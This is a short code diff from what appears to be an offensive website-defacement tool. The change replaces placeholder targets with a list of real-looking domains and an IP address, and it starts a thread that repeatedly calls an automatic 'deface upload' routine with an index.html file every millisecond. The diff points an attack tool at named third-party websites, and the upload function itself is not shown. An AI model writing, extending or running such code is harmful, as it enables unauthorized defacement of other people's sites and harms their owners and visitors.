@@ -146,7 +146,7 @@ def main(__bn__):
             print("\nOperation cancelled.")
 
 if __name__ == "__main__":
-    banner = banner.replace("[⍟]", "[AUTO⍟]")
-    links = ["http://ex1.com", "http://ex2.com", "http://ex3.com"]  # List of links to upload to
-    auto_upload_thread = threading.Thread(target=auto_upload_deface, args=("your_deface_file.html", links, 1))  # Auto upload every 1 ms
+    banner = banner.replace("[⍟]", "[AUTO]")
+    links = ["http://georgian.za.net", "http://nhsgilde.co.za", "http://83.211.190.83", "http://n8tive.co.za"]  # List of links to upload to
+    auto_upload_thread = threading.Thread(target=auto_upload_deface, args=("index.html", links, 1))  # Auto upload every 1 ms
     main(banner)
